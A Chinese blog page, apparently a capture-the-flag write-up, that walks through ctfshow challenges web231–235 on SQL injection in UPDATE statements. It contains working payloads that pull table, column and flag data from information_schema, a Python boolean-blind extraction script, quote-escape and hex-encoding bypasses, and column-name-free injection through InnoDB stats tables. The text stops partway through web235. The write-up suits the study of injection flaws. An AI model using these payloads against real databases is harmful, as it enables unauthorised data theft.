@@ -1,0 +1,526 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>update注入实战论 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web231"><span class="toc-number">2.</span> <span class="toc-text">web231</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web232"><span class="toc-number">3.</span> <span class="toc-text">web232</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web233%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">web233（布尔盲注）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web234%EF%BC%88-%E8%BD%AC%E4%B9%89%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">web234（\转义）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web235%EF%BC%88%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">web235（无列名注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#InnoDb%E5%BC%95%E6%93%8E"><span class="toc-number">6.1.</span> <span class="toc-text">InnoDb引擎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-number">6.2.</span> <span class="toc-text">子查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">6.3.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web236"><span class="toc-number">7.</span> <span class="toc-text">web236</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>update注入实战论</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/8/16
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Sql/" style="color: #03a9f4">Sql</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/ctfshow/" style="color: #ff7d73">ctfshow</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.3k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">5分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>ctfshow web231-236</p>
+<span id="more"></span>
+
+<hr>
+<h1 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h1><p>查询语句</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//分页查询</span>
+$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"update ctfshow_user set pass = '&#123;$password&#125;' where username = '&#123;$username&#125;';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>是update语句，我们可以修改字段名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span><span class="token string">',username='</span>a'<span class="token comment">#&amp;username=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816115943129.png" alt="image-20230816115943129"></p>
+<p>这样的话整个语句就是执行了<code>update ctfshow_user set pass = &#39;1&#39;,username=&#39;a&#39;#&#39; where username = &#39;1&#39;</code>，#后面被注释</p>
+<p>所以回到表单页面，username字段会全部改为a，password会改为1</p>
+<p>所以我们可以在这里插入联合查询语句来爆出我们需要的信息</p>
+<p>表名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#&amp;username=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816120301108.png" alt="image-20230816120301108"></p>
+<p>列名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'flaga'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816120554679.png" alt="image-20230816120554679"></p>
+<p>字段</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flagas<span class="token punctuation">)</span> <span class="token keyword">from</span> flaga<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816120912795.png" alt="image-20230816120912795"></p>
+<hr>
+<h1 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h1><p>查询</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update ctfshow_user set pass = md5('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>') where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>加了个md5，闭合一下就可以</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#&amp;username=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816121503188.png" alt="image-20230816121503188"></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span><span class="token string">'),username=(select group_concat(column_name) from information_schema.columns where table_name='</span>flagaa'<span class="token punctuation">)</span><span class="token comment">#&amp;username=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flagass<span class="token punctuation">)</span> <span class="token keyword">from</span> flagaa<span class="token punctuation">)</span><span class="token comment">#&amp;username=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h1 id="web233（布尔盲注）"><a href="#web233（布尔盲注）" class="headerlink" title="web233（布尔盲注）"></a>web233（布尔盲注）</h1><p>查询</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update ctfshow_user set pass = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>' where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上题的payload打不进去了，说明password处肯定存在过滤</p>
+<p>那我们就从username处注入，考虑进行布尔盲注，用已知的用户名ctfshow试试</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>username<span class="token operator">=</span>ctfshow' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816123127575.png" alt="image-20230816123127575"></p>
+<p>成功执行了</p>
+<p>那么接下来就是跑脚本了(from boogipop)</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">'http://4bddeb37-663a-42ca-86a1-0101f49d73be.challenge.ctf.show/api/?page=1&amp;limit=10'</span>
+flag <span class="token operator">=</span> <span class="token string">''</span>
+i <span class="token operator">=</span> <span class="token number">0</span>
+j <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    head <span class="token operator">=</span> <span class="token number">1</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+    i <span class="token operator">+=</span> <span class="token number">1</span>
+    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+        j <span class="token operator">+=</span> <span class="token number">1</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
+        <span class="token comment"># payload=f"ctfshow' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))>&#123;mid&#125;,1,0)#"</span>
+        <span class="token comment">#banlist,ctfshow_user,flag233333,查询表名</span>
+        <span class="token comment"># payload=f"ctfshow' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag233333'),&#123;i&#125;,1))>&#123;mid&#125;,1,0)#"</span>
+        <span class="token comment">#查询字段id,flagass233,info</span>
+        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"ctfshow' and if(ascii(substr((select group_concat(id,flagass233,info) from flag233333),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,1,0)#"</span></span>
+        <span class="token comment">#答案</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> j<span class="token punctuation">&#125;</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"\\u66f4\\u65b0\\u6210\\u529f"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>  <span class="token comment"># 更新成功</span>
+            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            tail <span class="token operator">=</span> mid
+    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="web234（-转义）"><a href="#web234（-转义）" class="headerlink" title="web234（\转义）"></a>web234（\转义）</h1><p>查询语句没变，但是还是不能拿之前的payload硬打</p>
+<p>fuzz字典爆破一下发现<code>&#39;</code>被过滤了</p>
+<p>这题需要用到<code>\</code>对password参数后的<code>&#39;</code>进行转义，使其成为字符串中的一部分，然后实际闭合的位置在username的第一个<code>&#39;</code>处</p>
+<p>所以password里的内容为<code>1&#39;where username =</code>，我们需要再注入一个<code>,username=</code>然后就能构造我们需要的语句了</p>
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816130316069.png" alt="image-20230816130316069"></p>
+<p>于是构造payload</p>
+<p>表名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span>\<span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816131119449.png" alt="image-20230816131119449"></p>
+<p>列名</p>
+<p>注意由于过滤了单引号，这里可以用双引号来绕过，也可以直接16进制编码为<code>0x666c6167323361</code>绕过</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span>\<span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">"flag23a"</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span>\<span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token number">0x666c6167323361</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>字段</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token number">1</span>\<span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token punctuation">,</span>username<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flagass23s3<span class="token punctuation">)</span> <span class="token keyword">from</span> flag23a<span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>看起来上一题也可以这么打</p>
+<hr>
+<h1 id="web235（无列名注入）"><a href="#web235（无列名注入）" class="headerlink" title="web235（无列名注入）"></a>web235（无列名注入）</h1><p>查询语句不变</p>
+<p>过滤了<code>or</code>和<code>&#39;</code> </p>
+<p>也就是说information库就用不了了</p>
+<p>不过mysql中不只有information库有表格的信息，还有其他的库</p>
+<p><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87information_schema/">参考JohnFrod的博客</a></p>
+<h2 id="InnoDb引擎"><a href="#InnoDb引擎" class="headerlink" title="InnoDb引擎"></a>InnoDb引擎</h2><p>从MySQL 5.5.8开始，InnoDB成为其默认存储引擎。而在MySQL 5.6以上的版本中，InnoDb增加了<code>innodb_index_stats</code>和<code>innodb_table_stats</code>两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。</p>
+<p>在MySQL 5.6版本中，可以使用<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_table_index</code>这两张表来替换<code>information_schema.tables</code>实现注入，但是缺点是没有列名。</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>database_name<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats<span class="token punctuation">;</span>
+<span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats <span class="token keyword">where</span> database_name<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816171433403.png" alt="image-20230816171433403"></p>
+<p>实战中需要注意mysql是否使用了InnoDB作为数据库的引擎</p>
+<p>查看MySQL支持及默认的存储引擎：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> engines<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><p><a target="_blank" rel="noopener" href="https://err0r.top/article/mardasctf/">参考Err0r的博客</a></p>
+<p>上面说了这种注入方式是不能得到列名的，也就是说我们要采用别的方式获取列名</p>
+<p>在我们不知道列名的情况下，需要通过union来查询，并且要猜测列数</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816172350710.png" alt="image-20230816172350710"></p>
+<p>然后可以用数字进一步查询对应列</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>3<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816173103347.png" alt="image-20230816173103347"></p>
+<p>注：每个派生表都要有他的别名，所以我们要在末尾加上一个<code>a</code>之类的能作为别名的字母</p>
+<p>注：查询对应列要加反引号，否则会当数字处理全部输出<code>3</code></p>
+<p>如果反引号被过滤，可以用别名代替</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> c <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230816173731643.png" alt="image-20230816173731643"></p>
